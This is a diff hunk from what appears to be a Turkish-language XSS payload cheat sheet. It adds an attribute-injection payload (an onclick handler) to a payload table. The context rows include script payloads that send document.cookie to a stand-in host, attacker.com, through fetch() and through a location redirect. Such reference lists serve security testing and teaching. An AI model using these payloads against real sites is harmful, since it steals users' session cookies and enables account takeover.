@@ -51,7 +51,7 @@ Saldırganlar hedef kullanıcının tarayıcısında zararlı JavaScript kodu ç
 | `<script>alert(document.domain)</script>` | Domain görüntüleme | ✅ |
 | `<script>fetch('https://attacker.com?c='+document.cookie)</script>` | Cookie dışarı gönderme | ⚠️ |
 | `<script>document.location='https://attacker.com?c='+document.cookie</script>` | Yönlendirme ile çalma | ⚠️ |
-
+| `" onclick="alert(1)` | h1,h2,h3 veya p etiketleri için| ⚠️ |
 ---
 
 ## 🕰️ Eski / Çalışma İhtimali Düşük Payload'lar
